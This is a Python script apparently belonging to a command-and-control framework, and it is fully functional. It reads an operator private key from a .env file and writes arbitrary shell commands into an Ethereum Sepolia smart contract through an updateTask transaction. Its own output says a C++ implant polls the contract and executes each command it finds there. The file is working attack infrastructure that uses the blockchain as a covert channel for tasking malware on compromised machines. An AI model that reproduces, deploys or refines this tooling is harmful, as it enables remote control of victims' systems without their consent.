import sys
import os
import time
from web3 import Web3
from dotenv import load_dotenv

# Load environment variables from the hub/.env file
load_dotenv("hub/.env")

# We need the full URL for Python, and the raw key for C++
RPC_URL = os.getenv("SEPOLIA_RPC_URL") 
PRIVATE_KEY = os.getenv("OPERATOR_PRIVATE_KEY")
CONTRACT_ADDRESS = Web3.to_checksum_address("0x20568FaA965AAf02E8c68359FaE2c57e81Ba31de")

if not RPC_URL or not PRIVATE_KEY:
    print("[-] FATAL: SEPOLIA_RPC_URL or PRIVATE_KEY not found in hub/.env")
    sys.exit(1)

# Minimal ABI just for the updateTask function
ABI = [
    {
        "inputs": [
            {"internalType": "uint256", "name": "_newTaskID", "type": "uint256"},
            {"internalType": "bytes", "name": "_newPayload", "type": "bytes"}
        ],
        "name": "updateTask",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]

def main():
    if len(sys.argv) < 2:
        print("Usage: python operator.py \"<command>\"")
        print("Example: python operator.py \"ipconfig /all\"")
        sys.exit(1)

    command = sys.argv[1]
    print(f"\n[*] Tasking Implant with command: {command}")

    # Connect to Web3
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[-] FATAL: Could not connect to Sepolia via Alchemy.")
        sys.exit(1)

    account = w3.eth.account.from_key(PRIVATE_KEY)
    contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)

    # Convert ASCII command to bytes
    payload_bytes = command.encode('utf-8')

    print(f"[*] Building Ethereum Transaction...")
    
    # Build transaction
    nonce = w3.eth.get_transaction_count(account.address)
    tx = contract.functions.updateTask(1, payload_bytes).build_transaction({
        'chainId': 11155111, # Sepolia Testnet
        'gas': 2000000,
        'maxFeePerGas': w3.to_wei('20', 'gwei'),
        'maxPriorityFeePerGas': w3.to_wei('2', 'gwei'),
        'nonce': nonce,
    })

    print(f"[*] Signing Transaction with Operator Key...")
    signed_tx = w3.eth.account.sign_transaction(tx, private_key=PRIVATE_KEY)

    print(f"[*] Broadcasting to Sepolia Network...")
    try:
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
        print(f"[*] Transaction Hash: {w3.to_hex(tx_hash)}")
        print(f"[*] Waiting for block confirmation (approx 10-15 seconds)...")

        # Wait for the blockchain to mine the block
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        
        if receipt.status == 1:
            print(f"[+] SUCCESS! Payload burned into EVM State.")
            print(f"[+] The C++ Implant will execute '{command}' on its next poll.")
        else:
            print(f"[-] Transaction failed on-chain. Check your testnet gas.")
            
    except Exception as e:
        print(f"[-] Error executing transaction: {e}")

if __name__ == "__main__":
    main()